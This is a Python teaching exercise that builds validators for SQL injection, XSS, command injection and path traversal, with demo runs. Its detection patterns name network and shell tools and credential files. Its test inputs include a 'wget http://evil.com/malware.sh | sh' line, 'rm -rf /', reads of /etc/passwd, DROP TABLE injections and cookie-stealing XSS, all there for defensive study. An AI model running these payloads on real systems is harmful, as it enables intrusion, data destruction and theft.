"""
=============================================================================
AI Security Exercise 03: Input Validation & Sanitization
=============================================================================

Topic: Input Validation
-----------------------
Input validation is the first line of defense against injection attacks,
XSS, command injection, and other security vulnerabilities. This exercise
covers comprehensive input validation techniques for AI system inputs.

Learning Objectives:
  1. Implement input sanitization for multiple attack vectors
  2. Prevent SQL injection in AI-to-database interactions
  3. Block XSS in generated and user-provided content
  4. Prevent command injection in tool-use scenarios
  5. Design robust input validation pipelines

Prerequisites:
  - Python 3.9+
  - re, html, shlex, os, pathlib, json, logging, dataclasses, enum, typing
  - Optional: sqlparse (pip install sqlparse)

WARNING: This code is for EDUCATIONAL purposes.
=============================================================================
"""

import re
import html
import shlex
import json
import logging
import hashlib
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from pathlib import Path, PurePath
from typing import Optional, Any, Callable
from urllib.parse import urlparse, unquote

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
logger = logging.getLogger("input_validation")


# =============================================================================
# Section 1: Validation Severity & Results
# =============================================================================

class ThreatLevel(Enum):
    """Threat levels for validation failures."""
    SAFE = 0
    SUSPICIOUS = 1
    MALICIOUS = 2
    CRITICAL = 3


@dataclass
class ValidationResult:
    """Result of an input validation check."""
    is_valid: bool
    threat_level: ThreatLevel
    validator_name: str
    message: str
    original_input: str
    sanitized_output: str = ""
    details: dict = field(default_factory=dict)

    @property
    def should_reject(self) -> bool:
        return not self.is_valid and self.threat_level.value >= ThreatLevel.MALICIOUS.value

    @property
    def should_log(self) -> bool:
        return self.threat_level.value >= ThreatLevel.SUSPICIOUS.value


# =============================================================================
# Section 2: SQL Injection Prevention
# =============================================================================

class SQLInjectionValidator:
    """
    Detects and prevents SQL injection attacks in user inputs.

    Strategies:
      1. Pattern-based detection of SQL syntax
      2. Parameterized query enforcement
      3. Input encoding for safe database insertion
    """

    # SQL injection patterns organized by technique
    INJECTION_PATTERNS = {
        "classic_union": [
            r"(?i)(UNION\s+(ALL\s+)?SELECT)",
            r"(?i)(SELECT\s+.*\s+FROM\s+.*\s+WHERE)",
            r"(?i)(INSERT\s+INTO\s+.*\s+VALUES)",
            r"(?i)(DELETE\s+FROM\s+.*\s+WHERE)",
            r"(?i)(UPDATE\s+.*\s+SET\s+.*\s+WHERE)",
            r"(?i)(DROP\s+(TABLE|DATABASE|COLUMN))",
        ],
        "blind_injection": [
            r"(?i)(AND\s+\d+\s*=\s*\d+)",
            r"(?i)(OR\s+\d+\s*=\s*\d+)",
            r"(?i)(AND\s+['\"]?\w+['\"]?\s*=\s*['\"]?\w+['\"]?)",
            r"(?i)(OR\s+['\"]?\w+['\"]?\s*=\s*['\"]?\w+['\"]?)",
            r"(?i)(AND\s+SUBSTRING)",
            r"(?i)(AND\s+ASCII)",
            r"(?i)(AND\s+LENGTH)",
        ],
        "time_based": [
            r"(?i)(WAITFOR\s+DELAY)",
            r"(?i)(SLEEP\s*\(\s*\d+\s*\))",
            r"(?i)(BENCHMARK\s*\()",
            r"(?i)(PG_SLEEP\s*\()",
            r"(?i)(LOAD_FILE\s*\()",
        ],
        "stacked_queries": [
            r";\s*(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER)",
            r";\s*--",
            r";\s*/\*",
        ],
        "comment_abuse": [
            r"--\s*$",
            r"/\*.*\*/",
            r"#\s*$",
        ],
        "encoding_tricks": [
            r"(?i)(0x[0-9a-fA-F]{4,})",  # Hex-encoded strings
            r"(?i)(CHAR\s*\(\s*\d+)",      # CHAR() encoding
            r"(?i)(CONCAT\s*\()",            # String concatenation
            r"(?i)(EXEC\s*\(|EXECUTE\s*\()", # Dynamic execution
        ],
    }

    # SQL keywords that are suspicious in user input
    DANGEROUS_KEYWORDS = [
        "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER",
        "EXEC", "EXECUTE", "UNION", "WHERE", "FROM", "TABLE", "DATABASE",
        "GRANT", "REVOKE", "TRUNCATE", "MERGE", "DECLARE", "CURSOR",
    ]

    def __init__(self, strict_mode: bool = True):
        self.strict_mode = strict_mode
        self.compiled_patterns: dict[str, list[re.Pattern]] = {}
        for category, patterns in self.INJECTION_PATTERNS.items():
            self.compiled_patterns[category] = [
                re.compile(pat) for pat in patterns
            ]

    def validate(self, user_input: str) -> ValidationResult:
        """Validate input for SQL injection attempts."""
        threats = []
        details = {}

        # Pattern matching
        for category, patterns in self.compiled_patterns.items():
            matches = []
            for pattern in patterns:
                found = pattern.findall(user_input)
                if found:
                    matches.extend(found[:3])
            if matches:
                threats.append(category)
                details[category] = matches[:5]

        # Keyword density analysis
        words = re.findall(r"\b\w+\b", user_input.upper())
        keyword_count = sum(1 for w in words if w in self.DANGEROUS_KEYWORDS)
        keyword_ratio = keyword_count / max(len(words), 1)

        if keyword_ratio > 0.3:
            threats.append("high_keyword_density")
            details["keyword_ratio"] = f"{keyword_ratio:.2%}"

        # Semicolon + keyword combo
        if ";" in user_input:
            for kw in self.DANGEROUS_KEYWORDS:
                if kw.lower() in user_input.lower().split(";")[1:]:
                    threats.append("stacked_query嫌疑")
                    break

        # Calculate threat level
        if not threats:
            threat_level = ThreatLevel.SAFE
        elif len(threats) == 1 and "comment_abuse" in threats:
            threat_level = ThreatLevel.SUSPICIOUS
        elif "classic_union" in threats or "stacked_queries" in threats:
            threat_level = ThreatLevel.CRITICAL
        elif "blind_injection" in threats or "time_based" in threats:
            threat_level = ThreatLevel.MALICIOUS
        else:
            threat_level = ThreatLevel.SUSPICIOUS

        # Sanitize output
        sanitized = self._sanitize(user_input) if self.strict_mode else user_input

        is_valid = threat_level.value <= ThreatLevel.SUSPICIOUS.value

        return ValidationResult(
            is_valid=is_valid,
            threat_level=threat_level,
            validator_name="SQLInjection",
            message=f"SQL injection {'detected' if threats else 'not detected'}",
            original_input=user_input,
            sanitized_output=sanitized,
            details={"threats": threats, **details},
        )

    def _sanitize(self, input_str: str) -> str:
        """Sanitize input for safe SQL parameterization."""
        # Escape single quotes (basic defense - prefer parameterized queries)
        sanitized = input_str.replace("'", "''")
        # Remove null bytes
        sanitized = sanitized.replace("\x00", "")
        # Encode dangerous characters
        sanitized = sanitized.replace(";", "\\;")
        return sanitized

    @staticmethod
    def create_parameterized_query(
        template: str, params: dict[str, Any]
    ) -> tuple[str, list[Any]]:
        """
        Create a parameterized query to prevent SQL injection.

        Args:
            template: SQL template with :param placeholders
            params: Dictionary of parameter values

        Returns:
            Tuple of (safe_query, param_values)
        """
        import re as _re
        param_names = _re.findall(r":(\w+)", template)
        safe_template = _re.sub(r":(\w+)", "?", template)
        param_values = [params[name] for name in param_names]
        return safe_template, param_values


# =============================================================================
# Section 3: XSS Prevention
# =============================================================================

class XSSValidator:
    """
    Detects and prevents Cross-Site Scripting (XSS) attacks.

    Covers:
      1. Script tag injection
      2. Event handler injection
      3. JavaScript URI schemes
      4. DOM-based XSS patterns
    """

    XSS_PATTERNS = {
        "script_tags": [
            r"<\s*script[^>]*>",
            r"</\s*script\s*>",
            r"<\s*script\b",
            r"javascript\s*:",
        ],
        "event_handlers": [
            r"(?i)\bon\w+\s*=\s*['\"].*?['\"]",  # onclick=, onerror=, etc.
            r"(?i)\bon\w+\s*=\s*\w+",               # onclick=functionName
        ],
        "javascript_uri": [
            r"(?i)javascript\s*:",
            r"(?i)vbscript\s*:",
            r"(?i)data\s*:\s*text/html",
            r"(?i)livescript\s*:",
        ],
        "dom_manipulation": [
            r"(?i)(eval|expression)\s*\(",
            r"(?i)document\.(write|writeln|cookie|location)",
            r"(?i)window\.(location|open|eval)",
            r"(?i)(innerHTML|outerHTML)\s*=",
            r"(?i)element\.(setAttribute|setAttributeNode)",
        ],
        "encoding_bypass": [
            r"(?i)&#\d+;",          # HTML entity encoding
            r"(?i)&#[xX][0-9a-f]+;", # Hex entity encoding
            r"(?i)%3[Cc]script",     # URL encoded <
            r"(?i)%3[Ee]",           # URL encoded >
            r"(?i)\\u[0-9a-fA-F]{4}", # Unicode escape
        ],
        "css_injection": [
            r"(?i)expression\s*\(",
            r"(?i)url\s*\(\s*['\"]?\s*javascript:",
            r"(?i)-moz-binding\s*:",
            r"(?i)behavior\s*:\s*url",
        ],
    }

    # Tags that should never appear in user content
    FORBIDDEN_TAGS = [
        "script", "iframe", "object", "embed", "applet",
        "form", "input", "button", "link", "meta", "base",
    ]

    def __init__(self, allowed_tags: Optional[list[str]] = None):
        self.allowed_tags = set(allowed_tags or ["b", "i", "u", "em", "strong", "p", "br"])
        self.compiled_patterns: dict[str, list[re.Pattern]] = {}
        for category, patterns in self.XSS_PATTERNS.items():
            self.compiled_patterns[category] = [
                re.compile(pat) for pat in patterns
            ]

    def validate(self, user_input: str) -> ValidationResult:
        """Validate input for XSS attacks."""
        threats = []
        details = {}

        # Pattern matching
        for category, patterns in self.compiled_patterns.items():
            matches = []
            for pattern in patterns:
                found = pattern.findall(user_input)
                if found:
                    matches.extend(found[:3])
            if matches:
                threats.append(category)
                details[category] = matches[:5]

        # Forbidden tag detection
        tag_pattern = re.compile(r"<\s*(\w+)", re.IGNORECASE)
        found_tags = tag_pattern.findall(user_input)
        forbidden_found = [t for t in found_tags if t.lower() in self.FORBIDDEN_TAGS]
        if forbidden_found:
            threats.append("forbidden_tags")
            details["forbidden_tags"] = list(set(forbidden_found))

        # Calculate threat level
        if not threats:
            threat_level = ThreatLevel.SAFE
        elif "script_tags" in threats or "javascript_uri" in threats:
            threat_level = ThreatLevel.CRITICAL
        elif "event_handlers" in threats or "dom_manipulation" in threats:
            threat_level = ThreatLevel.MALICIOUS
        else:
            threat_level = ThreatLevel.SUSPICIOUS

        sanitized = self._sanitize(user_input)
        is_valid = threat_level.value <= ThreatLevel.SUSPICIOUS.value

        return ValidationResult(
            is_valid=is_valid,
            threat_level=threat_level,
            validator_name="XSS",
            message=f"XSS {'detected' if threats else 'not detected'}",
            original_input=user_input,
            sanitized_output=sanitized,
            details={"threats": threats, **details},
        )

    def _sanitize(self, input_str: str) -> str:
        """Sanitize HTML input to prevent XSS."""
        # HTML-escape all content
        sanitized = html.escape(input_str)

        # Re-allow only safe tags
        for tag in self.allowed_tags:
            # Restore allowed opening tags
            escaped_open = html.escape(f"<{tag}")
            original_open = f"<{tag}"
            sanitized = sanitized.replace(escaped_open, original_open)

            # Restore allowed closing tags
            escaped_close = html.escape(f"</{tag}>")
            original_close = f"</{tag}>"
            sanitized = sanitized.replace(escaped_close, original_close)

        return sanitized


# =============================================================================
# Section 4: Command Injection Prevention
# =============================================================================

class CommandInjectionValidator:
    """
    Detects and prevents command injection attacks.

    Particularly important for AI systems with tool-use capabilities
    that execute shell commands or system operations.
    """

    COMMAND_INJECTION_PATTERNS = {
        "shell_metacharacters": [
            r"[;&|`$]",                    # Shell metacharacters
            r"\$\(",                        # Command substitution
            r"\$\{",                        # Variable expansion
            r">[>&]",                       # Redirect/duplicate
            r"\\n|\\r",                     # Newline injection
        ],
        "dangerous_commands": [
            r"(?i)^(\s*)(rm|del|format|mkfs|dd|wget|curl|nc|ncat|netcat)\b",
            r"(?i)^(\s*)(chmod|chown|chgrp|passwd|useradd|userdel)\b",
            r"(?i)^(\s*)(sudo|su|doas|runas)\b",
            r"(?i)^(\s*)(iptables|firewall|ufw)\b",
            r"(?i)^(\s*)(mount|umount|fdisk|parted)\b",
        ],
        "pipe_abuse": [
            r"\|\s*(bash|sh|zsh|cmd|powershell)",
            r"\|\s*(curl|wget)\s+",
            r"\|\s*(python|perl|ruby|node)\s",
            r"\|\s*(base64|xxd)\s",
        ],
        "backtick_injection": [
            r"`[^`]+`",
            r"\$\([^)]+\)",
        ],
        "path_traversal_in_command": [
            r"\.\./",
            r"\.\.\\",
            r"(?i)/etc/(passwd|shadow|hosts)",
            r"(?i)/proc/(self|environ|cmdline)",
            r"(?i)\\\\[^\\]+\\",            # UNC path
        ],
    }

    # Whitelist of safe command patterns for tool-use
    SAFE_COMMAND_PATTERNS = [
        re.compile(r"^python\s+[\w./_-]+\.py$"),
        re.compile(r"^pip\s+(install|list|show)\s+[\w._-]+$"),
        re.compile(r"^npm\s+(install|list|show)\s+[\w._-]+$"),
        re.compile(r"^(git|ls|cat|head|tail|grep|find)\s+[\w./_ -]+$"),
        re.compile(r"^(echo|printf)\s+[\w\s'\"._-]+$"),
    ]

    def __init__(self, allowed_commands: Optional[list[str]] = None):
        self.allowed_commands = set(allowed_commands or [])
        self.compiled_patterns: dict[str, list[re.Pattern]] = {}
        for category, patterns in self.COMMAND_INJECTION_PATTERNS.items():
            self.compiled_patterns[category] = [
                re.compile(pat) for pat in patterns
            ]

    def validate(self, command: str) -> ValidationResult:
        """Validate a command for injection attempts."""
        threats = []
        details = {}

        # Check against whitelist first
        is_whitelisted = any(
            pat.match(command.strip()) for pat in self.SAFE_COMMAND_PATTERNS
        )

        if is_whitelisted and not self.allowed_commands:
            return ValidationResult(
                is_valid=True,
                threat_level=ThreatLevel.SAFE,
                validator_name="CommandInjection",
                message="Command matches whitelist",
                original_input=command,
                sanitized_output=command,
            )

        # Pattern matching
        for category, patterns in self.compiled_patterns.items():
            matches = []
            for pattern in patterns:
                found = pattern.findall(command)
                if found:
                    matches.extend([str(m) for m in found[:3]])
            if matches:
                threats.append(category)
                details[category] = matches

        # Calculate threat level
        if not threats:
            threat_level = ThreatLevel.SAFE
        elif "dangerous_commands" in threats:
            threat_level = ThreatLevel.CRITICAL
        elif "shell_metacharacters" in threats or "pipe_abuse" in threats:
            threat_level = ThreatLevel.MALICIOUS
        else:
            threat_level = ThreatLevel.SUSPICIOUS

        sanitized = self._sanitize(command)
        is_valid = threat_level.value <= ThreatLevel.SUSPICIOUS.value

        return ValidationResult(
            is_valid=is_valid,
            threat_level=threat_level,
            validator_name="CommandInjection",
            message=f"Command injection {'detected' if threats else 'not detected'}",
            original_input=command,
            sanitized_output=sanitized,
            details={"threats": threats, **details},
        )

    def _sanitize(self, command: str) -> str:
        """Sanitize a command string for safe execution."""
        # Use shlex.quote for safe quoting
        parts = command.split()
        if parts:
            return " ".join(shlex.quote(part) for part in parts)
        return command

    @staticmethod
    def build_safe_command(binary: str, args: list[str]) -> str:
        """Build a safely quoted command string."""
        safe_args = [shlex.quote(str(a)) for a in args]
        return f"{shlex.quote(binary)} {' '.join(safe_args)}"


# =============================================================================
# Section 5: Path Traversal Prevention
# =============================================================================

class PathTraversalValidator:
    """
    Detects and prevents path traversal attacks in file paths.

    Protects against:
      1. Directory traversal (../)
      2. Absolute path injection
      3. Symlink attacks
      4. Null byte injection
    """

    def __init__(self, allowed_base_dirs: Optional[list[str]] = None):
        self.allowed_base_dirs = [
            Path(d).resolve() for d in (allowed_base_dirs or ["/tmp/uploads"])
        ]

    def validate(self, file_path: str, operation: str = "read") -> ValidationResult:
        """Validate a file path for traversal attacks."""
        threats = []
        details = {}

        # Check for null bytes
        if "\x00" in file_path:
            threats.append("null_byte_injection")
            details["null_byte"] = True

        # Check for directory traversal
        if ".." in file_path:
            threats.append("directory_traversal")
            details["parent_reference"] = file_path.count("..")

        # Check for absolute path injection
        if Path(file_path).is_absolute():
            threats.append("absolute_path")
            details["absolute_path"] = file_path

        # Check for URL-encoded traversal
        decoded = unquote(file_path)
        if decoded != file_path and (".." in decoded or "/" in decoded):
            threats.append("encoded_traversal")
            details["decoded_path"] = decoded

        # Normalize and check against allowed directories
        try:
            resolved = Path(file_path).resolve()
            # Check if the resolved path is within any allowed directory
            is_within_allowed = any(
                str(resolved).startswith(str(allowed))
                for allowed in self.allowed_base_dirs
            )
            if not is_within_allowed and self.allowed_base_dirs:
                threats.append("outside_allowed_directory")
                details["resolved_path"] = str(resolved)
        except (ValueError, OSError) as e:
            threats.append("invalid_path")
            details["error"] = str(e)

        # Calculate threat level
        if not threats:
            threat_level = ThreatLevel.SAFE
        elif "null_byte_injection" in threats:
            threat_level = ThreatLevel.CRITICAL
        elif "directory_traversal" in threats or "encoded_traversal" in threats:
            threat_level = ThreatLevel.MALICIOUS
        else:
            threat_level = ThreatLevel.SUSPICIOUS

        sanitized = self._sanitize(file_path)
        is_valid = threat_level.value <= ThreatLevel.SUSPICIOUS.value

        return ValidationResult(
            is_valid=is_valid,
            threat_level=threat_level,
            validator_name="PathTraversal",
            message=f"Path traversal {'detected' if threats else 'not detected'}",
            original_input=file_path,
            sanitized_output=sanitized,
            details={"threats": threats, **details},
        )

    def _sanitize(self, file_path: str) -> str:
        """Sanitize a file path."""
        # Remove null bytes
        sanitized = file_path.replace("\x00", "")
        # Decode URL encoding
        sanitized = unquote(sanitized)
        # Resolve to absolute path
        try:
            resolved = Path(sanitized).resolve()
            # Check if within allowed directories
            for allowed in self.allowed_base_dirs:
                try:
                    resolved.relative_to(allowed)
                    return str(resolved)
                except ValueError:
                    continue
        except (ValueError, OSError):
            pass
        # Fallback: strip traversal sequences
        sanitized = re.sub(r"\.\.[\\/]", "", sanitized)
        sanitized = sanitized.lstrip("/\\")
        return sanitized


# =============================================================================
# Section 6: Input Length & Encoding Validation
# =============================================================================

@dataclass
class InputConstraints:
    """Configuration for input validation constraints."""
    max_length: int = 10000
    min_length: int = 1
    allowed_encodings: list[str] = field(default_factory=lambda: ["utf-8"])
    max_line_count: int = 1000
    max_word_count: int = 5000
    allow_null_bytes: bool = False
    allow_control_chars: bool = False
    required_pattern: Optional[str] = None


class ConstraintValidator:
    """
    Validates inputs against configurable constraints including
    length limits, encoding validation, and pattern matching.
    """

    def __init__(self, constraints: Optional[InputConstraints] = None):
        self.constraints = constraints or InputConstraints()

    def validate(self, text: str) -> ValidationResult:
        """Validate input against all configured constraints."""
        violations = []
        details = {}

        # Length check
        if len(text) > self.constraints.max_length:
            violations.append(f"Exceeds max length ({len(text)} > {self.constraints.max_length})")
            details["length"] = len(text)

        if len(text) < self.constraints.min_length:
            violations.append(f"Below min length ({len(text)} < {self.constraints.min_length})")
            details["length"] = len(text)

        # Null byte check
        if not self.constraints.allow_null_bytes and "\x00" in text:
            violations.append("Contains null bytes")
            details["null_bytes"] = text.count("\x00")

        # Control character check
        if not self.constraints.allow_control_chars:
            control_chars = [c for c in text if ord(c) < 32 and c not in "\n\r\t"]
            if control_chars:
                violations.append(f"Contains {len(control_chars)} control characters")
                details["control_chars"] = len(control_chars)

        # Line count check
        line_count = text.count("\n") + 1
        if line_count > self.constraints.max_line_count:
            violations.append(f"Too many lines ({line_count} > {self.constraints.max_line_count})")
            details["line_count"] = line_count

        # Word count check
        words = text.split()
        if len(words) > self.constraints.max_word_count:
            violations.append(f"Too many words ({len(words)} > {self.constraints.max_word_count})")
            details["word_count"] = len(words)

        # Encoding validation
        try:
            text.encode("utf-8")
        except UnicodeEncodeError:
            violations.append("Invalid UTF-8 encoding")
            details["encoding_error"] = True

        # Pattern validation
        if self.constraints.required_pattern:
            if not re.match(self.constraints.required_pattern, text):
                violations.append(f"Does not match required pattern: {self.constraints.required_pattern}")

        # Calculate threat level
        if not violations:
            threat_level = ThreatLevel.SAFE
        elif any("null" in v.lower() for v in violations):
            threat_level = ThreatLevel.CRITICAL
        elif any("length" in v.lower() or "line" in v.lower() for v in violations):
            threat_level = ThreatLevel.SUSPICIOUS
        else:
            threat_level = ThreatLevel.MALICIOUS

        sanitized = self._sanitize(text)
        is_valid = len(violations) == 0

        return ValidationResult(
            is_valid=is_valid,
            threat_level=threat_level,
            validator_name="Constraint",
            message=f"{len(violations)} constraint violation(s) found",
            original_input=text,
            sanitized_output=sanitized,
            details={"violations": violations, **details},
        )

    def _sanitize(self, text: str) -> str:
        """Sanitize input to meet constraints."""
        sanitized = text
        # Remove null bytes
        if not self.constraints.allow_null_bytes:
            sanitized = sanitized.replace("\x00", "")
        # Truncate to max length
        sanitized = sanitized[:self.constraints.max_length]
        # Limit lines
        lines = sanitized.split("\n")[:self.constraints.max_line_count]
        sanitized = "\n".join(lines)
        return sanitized


# =============================================================================
# Section 7: Validation Pipeline
# =============================================================================

class ValidationPipeline:
    """
    Comprehensive input validation pipeline combining multiple validators.

    Pipeline stages:
      1. Constraint validation (length, encoding)
      2. SQL injection check
      3. XSS check
      4. Command injection check
      5. Path traversal check
    """

    def __init__(self, config: Optional[dict] = None):
        config = config or {}
        self.validators = {
            "constraint": ConstraintValidator(
                config.get("constraints", InputConstraints())
            ),
            "sql_injection": SQLInjectionValidator(
                strict_mode=config.get("sql_strict", True)
            ),
            "xss": XSSValidator(
                allowed_tags=config.get("allowed_html_tags", [])
            ),
            "command_injection": CommandInjectionValidator(
                allowed_commands=config.get("allowed_commands", [])
            ),
            "path_traversal": PathTraversalValidator(
                allowed_base_dirs=config.get("allowed_dirs", ["/tmp"])
            ),
        }
        self.validation_log: list[dict] = []

    def validate(
        self,
        text: str,
        context: Optional[str] = None,
        skip_validators: Optional[list[str]] = None,
    ) -> dict[str, ValidationResult]:
        """
        Run all validators on the input text.

        Args:
            text: Input text to validate
            context: Optional context (e.g., "database_query", "file_path")
            skip_validators: Optional list of validator names to skip

        Returns:
            Dictionary of validator_name -> ValidationResult
        """
        skip = set(skip_validators or [])
        results = {}

        # Stage 1: Always run constraint validation
        if "constraint" not in skip:
            results["constraint"] = self.validators["constraint"].validate(text)

        # Stage 2-5: Context-aware validation
        validators_to_run = self._select_validators(context)
        for name in validators_to_run:
            if name not in skip and name in self.validators:
                try:
                    results[name] = self.validators[name].validate(text)
                except Exception as e:
                    logger.error(f"Validator {name} failed: {e}")
                    results[name] = ValidationResult(
                        is_valid=True,
                        threat_level=ThreatLevel.SAFE,
                        validator_name=name,
                        message=f"Validator error: {e}",
                        original_input=text,
                    )

        # Log the validation
        overall_valid = all(r.is_valid for r in results.values())
        max_threat = max(
            (r.threat_level for r in results.values()),
            default=ThreatLevel.SAFE,
            key=lambda x: x.value,
        )
        self.validation_log.append({
            "input_hash": hashlib.sha256(text.encode()).hexdigest()[:16],
            "valid": overall_valid,
            "max_threat": max_threat.name,
            "validators_run": list(results.keys()),
            "timestamp": time.time(),
        })

        return results

    def _select_validators(self, context: Optional[str]) -> list[str]:
        """Select appropriate validators based on context."""
        if context == "database_query":
            return ["sql_injection"]
        elif context == "html_content":
            return ["xss"]
        elif context == "shell_command":
            return ["command_injection"]
        elif context == "file_path":
            return ["path_traversal"]
        else:
            # Run all validators for unknown context
            return ["sql_injection", "xss", "command_injection", "path_traversal"]

    def get_safe_output(self, results: dict[str, ValidationResult]) -> str:
        """Get the safest sanitized output from all validators."""
        # Priority: constraint > xss > sql > command > path
        priority_order = ["constraint", "xss", "sql_injection", "command_injection", "path_traversal"]
        for name in priority_order:
            if name in results and results[name].sanitized_output:
                return results[name].sanitized_output
        return ""


# =============================================================================
# Section 8: Demonstration & Testing
# =============================================================================

def demo_sql_injection():
    """Demonstrate SQL injection detection and prevention."""
    print("\n" + "=" * 72)
    print("DEMO 1: SQL Injection Prevention")
    print("=" * 72)

    validator = SQLInjectionValidator()
    test_cases = [
        ("SELECT * FROM users WHERE id = 1", "Classic SELECT injection"),
        ("'; DROP TABLE users; --", "Classic DROP injection"),
        ("1' OR '1'='1", "OR-based blind injection"),
        ("1 UNION SELECT username, password FROM admin", "UNION-based injection"),
        ("1; WAITFOR DELAY '0:0:5' --", "Time-based blind injection"),
        ("Find products under $50", "Safe input"),
        ("Hello, how are you?", "Safe input"),
    ]

    for text, description in test_cases:
        result = validator.validate(text)
        status = "BLOCKED" if result.should_reject else ("WARN" if result.threat_level != ThreatLevel.SAFE else "SAFE")
        print(f"\n  [{status}] {description}")
        print(f"  Input: \"{text[:60]}{'...' if len(text) > 60 else ''}\"")
        print(f"  Threat: {result.threat_level.name} | Valid: {result.is_valid}")
        if result.details.get("threats"):
            print(f"  Threats: {', '.join(result.details['threats'])}")

    # Show parameterized query creation
    print("\n  Parameterized Query Example:")
    template = "SELECT * FROM users WHERE name = :name AND age = :age"
    params = {"name": "John'; DROP TABLE users; --", "age": 25}
    safe_query, values = SQLInjectionValidator.create_parameterized_query(template, params)
    print(f"  Template: {template}")
    print(f"  Safe query: {safe_query}")
    print(f"  Values: {values}")


def demo_xss_prevention():
    """Demonstrate XSS detection and prevention."""
    print("\n" + "=" * 72)
    print("DEMO 2: XSS Prevention")
    print("=" * 72)

    validator = XSSValidator()
    test_cases = [
        ('<script>alert("XSS")</script>', "Script tag injection"),
        ('<img src=x onerror="alert(1)">', "Event handler injection"),
        ('javascript:alert(document.cookie)', "JavaScript URI"),
        ('<div style="background:url(javascript:alert(1))">', "CSS injection"),
        ('<b>Bold text</b> and <i>italic</i>', "Safe HTML"),
        ('Hello, this is plain text.', "Safe plain text"),
        ('&#60;script&#62;alert(1)&#60;/script&#62;', "HTML entity encoded XSS"),
    ]

    for text, description in test_cases:
        result = validator.validate(text)
        status = "BLOCKED" if result.should_reject else ("WARN" if result.threat_level != ThreatLevel.SAFE else "SAFE")
        print(f"\n  [{status}] {description}")
        print(f"  Input: \"{text[:60]}{'...' if len(text) > 60 else ''}\"")
        print(f"  Threat: {result.threat_level.name} | Valid: {result.is_valid}")
        if result.sanitized_output:
            print(f"  Sanitized: \"{result.sanitized_output[:60]}{'...' if len(result.sanitized_output) > 60 else ''}\"")


def demo_command_injection():
    """Demonstrate command injection detection and prevention."""
    print("\n" + "=" * 72)
    print("DEMO 3: Command Injection Prevention")
    print("=" * 72)

    validator = CommandInjectionValidator()
    test_cases = [
        ("ls -la /home", "Safe file listing"),
        ("python script.py --arg value", "Safe Python command"),
        ("ls; rm -rf /", "Chained dangerous command"),
        ("cat file.txt | bash", "Pipe to shell"),
        ("`whoami`", "Backtick command substitution"),
        ("$(cat /etc/passwd)", "Dollar-paren substitution"),
        ("wget http://evil.com/malware.sh | sh", "Remote code execution"),
        ("echo hello > /dev/null", "Safe redirect"),
    ]

    for text, description in test_cases:
        result = validator.validate(text)
        status = "BLOCKED" if result.should_reject else ("WARN" if result.threat_level != ThreatLevel.SAFE else "SAFE")
        print(f"\n  [{status}] {description}")
        print(f"  Input: \"{text}\"")
        print(f"  Threat: {result.threat_level.name} | Valid: {result.is_valid}")
        if result.details.get("threats"):
            print(f"  Threats: {', '.join(result.details['threats'])}")

    # Show safe command building
    print("\n  Safe Command Building:")
    safe_cmd = CommandInjectionValidator.build_safe_command("python", ["script.py", "arg with spaces", "arg'with'quotes"])
    print(f"  Safe command: {safe_cmd}")


def demo_path_traversal():
    """Demonstrate path traversal detection and prevention."""
    print("\n" + "=" * 72)
    print("DEMO 4: Path Traversal Prevention")
    print("=" * 72)

    validator = PathTraversalValidator(allowed_base_dirs=["/tmp/uploads", "/var/data"])
    test_cases = [
        ("file.txt", "Simple filename"),
        ("subdir/file.txt", "Nested file"),
        ("../../../etc/passwd", "Directory traversal"),
        ("uploads/../../../etc/shadow", "Traversal from subdirectory"),
        ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL-encoded traversal"),
        ("/tmp/uploads/file.txt", "Absolute path (allowed)"),
        ("/etc/passwd", "Absolute path (not allowed)"),
        ("file.txt\x00.jpg", "Null byte injection"),
    ]

    for text, description in test_cases:
        result = validator.validate(text)
        status = "BLOCKED" if result.should_reject else ("WARN" if result.threat_level != ThreatLevel.SAFE else "SAFE")
        print(f"\n  [{status}] {description}")
        print(f"  Input: \"{text}\"")
        print(f"  Threat: {result.threat_level.name} | Valid: {result.is_valid}")


def demo_constraint_validation():
    """Demonstrate constraint-based validation."""
    print("\n" + "=" * 72)
    print("DEMO 5: Input Constraint Validation")
    print("=" * 72)

    # Custom constraints
    constraints = InputConstraints(
        max_length=200,
        min_length=5,
        max_line_count=10,
        max_word_count=50,
        allow_null_bytes=False,
        allow_control_chars=False,
    )
    validator = ConstraintValidator(constraints)

    test_cases = [
        ("Hello, this is a valid input.", "Valid input"),
        ("Hi", "Too short"),
        ("A" * 300, "Too long"),
        ("line1\n" * 15, "Too many lines"),
        ("word " * 60, "Too many words"),
        ("Hello\x00World", "Null byte"),
        ("Hello\x01World", "Control character"),
    ]

    for text, description in test_cases:
        result = validator.validate(text)
        status = "BLOCKED" if not result.is_valid else "VALID"
        print(f"\n  [{status}] {description}")
        print(f"  Input length: {len(text)} | Threat: {result.threat_level.name}")
        if result.details.get("violations"):
            for v in result.details["violations"][:2]:
                print(f"    - {v}")


def demo_pipeline():
    """Demonstrate the complete validation pipeline."""
    print("\n" + "=" * 72)
    print("DEMO 6: Complete Validation Pipeline")
    print("=" * 72)

    pipeline = ValidationPipeline({
        "constraints": InputConstraints(max_length=5000),
        "allowed_dirs": ["/tmp/uploads"],
    })

    test_cases = [
        ("Hello, how can I help you?", None, "Normal user message"),
        ("'; DROP TABLE users; --", "database_query", "SQL injection in DB query"),
        ('<script>alert("XSS")</script>', "html_content", "XSS in HTML content"),
        ("ls; rm -rf /", "shell_command", "Command injection"),
        ("../../../etc/passwd", "file_path", "Path traversal"),
    ]

    for text, context, description in test_cases:
        results = pipeline.validate(text, context=context)
        any_threats = any(r.threat_level != ThreatLevel.SAFE for r in results.values())
        status = "THREATS" if any_threats else "CLEAN"
        print(f"\n  [{status}] {description}")
        print(f"  Context: {context or 'general'}")
        print(f"  Validators run: {list(results.keys())}")
        for name, result in results.items():
            if result.threat_level != ThreatLevel.SAFE:
                print(f"    {name}: {result.threat_level.name} - {result.message}")

    # Show validation log
    print(f"\n  Validation Log ({len(pipeline.validation_log)} entries):")
    for entry in pipeline.validation_log[-3:]:
        print(f"    Hash: {entry['input_hash']} | Valid: {entry['valid']} | Max Threat: {entry['max_threat']}")


# =============================================================================
# Section 9: Best Practices
# =============================================================================

BEST_PRACTICES = {
    "General Input Validation": [
        "Always validate input on the server side (never trust client-side validation alone)",
        "Use allowlists rather than blocklists when possible",
        "Validate input length, type, format, and range",
        "Normalize input before validation (e.g., decode URL encoding)",
        "Log validation failures for security monitoring",
    ],
